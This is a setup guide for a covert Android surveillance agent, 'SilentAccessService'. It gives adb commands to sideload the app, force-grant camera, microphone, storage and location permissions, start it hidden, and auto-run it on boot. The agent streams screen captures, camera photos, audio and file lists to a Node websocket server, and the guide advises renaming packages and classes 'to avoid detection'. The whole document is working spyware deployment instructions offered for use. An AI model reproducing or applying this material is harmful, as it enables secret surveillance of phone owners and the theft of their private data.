# Android Agent Setup Guide

## Installation Steps

### 1. **Create Project Structure**
```
android-agent-kotlin/
├── src/
│   ├── main/
│   │   ├── AndroidManifest.xml
│   │   ├── java/com/zenvora/agent/
│   │   │   ├── service/
│   │   │   │   └── SilentAccessService.kt
│   │   │   ├── manager/
│   │   │   │   ├── ScreenCaptureManager.kt
│   │   │   │   ├── CameraCaptureManager.kt
│   │   │   │   ├── AudioCapture.kt
│   │   │   │   ├── FileAccessManager.kt
│   │   │   │   └── NetworkMonitor.kt
│   │   │   ├── receiver/
│   │   │   │   └── BootReceiver.kt
│   │   │   └── activity/
│   │   │       ├── MainActivity.kt
│   │   │       └── HiddenActivity.kt
│   │   └── res/
│   │       ├── layout/
│   │       │   └── activity_main.xml
│   │       └── values/
│   │           └── strings.xml
├── build.gradle
├── proguard-rules.pro
└── AndroidManifest.xml
```

### 2. **Build the APK**
```bash
# Navigate to project directory
cd android-agent-kotlin

# Build APK
./gradlew assembleRelease

# Output: build/outputs/apk/release/app-release.apk
```

### 3. **Install on Device**
```bash
# Install APK
adb install build/outputs/apk/release/app-release.apk

# Or install and run
adb install -r build/outputs/apk/release/app-release.apk
adb shell am start -n com.zenvora.agent/.activity.MainActivity

# Start service directly
adb shell am startservice com.zenvora.agent/.service.SilentAccessService
```

### 4. **Grant Permissions**
```bash
# Camera
adb shell pm grant com.zenvora.agent android.permission.CAMERA

# Microphone
adb shell pm grant com.zenvora.agent android.permission.RECORD_AUDIO

# File Access
adb shell pm grant com.zenvora.agent android.permission.READ_EXTERNAL_STORAGE
adb shell pm grant com.zenvora.agent android.permission.WRITE_EXTERNAL_STORAGE
adb shell pm grant com.zenvora.agent android.permission.MANAGE_EXTERNAL_STORAGE

# Network
adb shell pm grant com.zenvora.agent android.permission.INTERNET
adb shell pm grant com.zenvora.agent android.permission.ACCESS_NETWORK_STATE

# Location (optional)
adb shell pm grant com.zenvora.agent android.permission.ACCESS_FINE_LOCATION
```

### 5. **Verify Installation**
```bash
# Check if service is running
adb shell dumpsys activity services | grep SilentAccessService

# View logs
adb logcat | grep "zenvora\|ScreenCapture\|CameraCapture\|AudioCapture"

# Check permissions
adb shell pm list permissions -g com.zenvora.agent
```

---

## Usage

### **Method 1: Through Activity (User-Friendly)**
User opens the app and taps "Start" button:
```bash
adb shell am start -n com.zenvora.agent/.activity.MainActivity
```

### **Method 2: Direct Service Start (Hidden)**
Start without showing UI:
```bash
adb shell am startservice com.zenvora.agent/.service.SilentAccessService
```

### **Method 3: Auto-Start on Boot**
Service will automatically start when device boots (BootReceiver enabled in manifest)

---

## Integration with Node Server

Update your Node server to handle incoming data from the Android agent:

```javascript
// server/routes/media.js
const express = require('express');
const router = express.Router();

router.ws('/android', (ws, req) => {
    ws.on('message', (message) => {
        const data = JSON.parse(message);
        
        switch (data.type) {
            case 'screen_data':
                // Save screen frame
                saveScreenFrame(data.data);
                break;
                
            case 'camera_frame':
                // Save camera frame
                saveCameraFrame(data.data);
                break;
                
            case 'audio_data':
                // Process audio stream
                processAudioStream(data.data);
                break;
                
            case 'network_status':
                // Store network info
                updateNetworkStatus(data);
                break;
                
            case 'file_list':
                // Index files
                indexFiles(data.files);
                break;
        }
    });
});

module.exports = router;
```

---

## Data Flow

```
Android Agent
    ├── ScreenCaptureManager
    │   └── Captures frames every 1 second
    │       └── Sends JPEG to: ws://server/gateway/android/screen
    │
    ├── CameraCaptureManager
    │   └── Captures photos every 2 seconds
    │       └── Sends JPEG to: ws://server/gateway/android/camera
    │
    ├── AudioCapture
    │   └── Streams audio chunks
    │       └── Sends PCM to: ws://server/gateway/android/audio
    │
    ├── FileAccessManager
    │   └── Syncs files every 30 seconds
    │       └── Sends file list to: ws://server/gateway/android/files
    │
    └── NetworkMonitor
        └── Reports network changes
            └── Sends status to: ws://server/gateway/android/network
```

---

## Configuration

### **Capture Intervals** (in SilentAccessService.kt)
```kotlin
ScreenCaptureManager.startCapture(interval = 1000L, quality = 70)  // 1 sec, 70% quality
CameraCaptureManager.startCapture(interval = 2000L)                // 2 sec
AudioCapture.startCapture()                                         // Continuous
FileAccessManager.startSync(interval = 30000L)                     // 30 sec
NetworkMonitor.start(interval = 10000L)                            // 10 sec
```

### **Quality Presets** (can be added)
```kotlin
// Low: 640x480, 35% quality, 8 FPS
// Medium: 850x640, 48% quality, 12 FPS (default)
// High: 1100x800, 62% quality, 18 FPS
// Ultra: 1440x1080, 72% quality, 25 FPS
```

---

## Troubleshooting

### Service Not Starting
```bash
# Check permissions
adb shell pm list permissions -g com.zenvora.agent

# View system logs
adb logcat "*:V" | grep zenvora
```

### Screen Capture Not Working
- Ensure activity has requested permission first
- Device must have Android 5.0+ (API 21+)
- Permission dialog appears first time, then works silently

### Camera/Microphone Access Denied
- Verify permissions granted:
  ```bash
  adb shell pm grant com.zenvora.agent android.permission.CAMERA
  adb shell pm grant com.zenvora.agent android.permission.RECORD_AUDIO
  ```
- Some devices require enabling in Settings > Apps > Permissions

### High Battery Drain
- Reduce capture intervals
- Lower resolution/quality
- Disable audio if not needed
- Use conditional capturing based on network state

---

## Production Deployment

### **APK Obfuscation**
```gradle
release {
    minifyEnabled true
    shrinkResources true
    proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
}
```

### **Package Name Obfuscation**
Use an obfuscator to rename:
- `com.zenvora.agent` → Something generic
- Class names to avoid detection
- String resources

### **Installation Without Play Store**
```bash
# Sideload on device
adb install -r app-release.apk

# Or use in enterprise deployment
# Push to device via MDM/EMM solution
adb push app-release.apk /sdcard/Download/
adb shell am install /sdcard/Download/app-release.apk
```

---

## Comparison: Windows vs Android Agent

| Feature | Windows (Rust) | Android (Kotlin) |
|---------|---|---|
| **Language** | Rust (binary) | Kotlin (APK) |
| **Size** | ~5 MB | ~10-15 MB |
| **Battery** | Always on | High drain if captures frequently |
| **Detection** | Hard to detect | Can check running services, battery |
| **Screen Capture** | xcap → DirectX | MediaProjection API |
| **Camera** | nokhwa → DirectShow | Camera2 API |
| **Auto-Start** | Service registry | BootReceiver intent |
| **Update** | Silent binary swap | APK reinstall via adb |

